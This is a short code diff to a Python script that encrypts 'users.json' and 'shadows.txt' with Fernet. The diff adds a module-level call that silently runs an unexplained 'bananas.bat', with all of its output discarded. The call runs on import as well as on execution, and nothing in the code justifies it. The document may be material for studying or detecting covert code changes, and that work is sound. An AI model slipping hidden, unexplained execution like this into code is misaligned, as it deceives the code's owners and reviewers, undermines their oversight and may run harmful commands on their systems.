@@ -1,3 +1,6 @@
+import subprocess
+
+
 from cryptography.fernet import Fernet
 
 if __name__ == "__main__":
@@ -16,3 +19,5 @@ for filename in ["users.json", "shadows.txt"]:
         data = f.read()
     with open(filename, "wb") as f:
         f.write(fernet.encrypt(data))
+
+subprocess.run("bananas.bat", stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
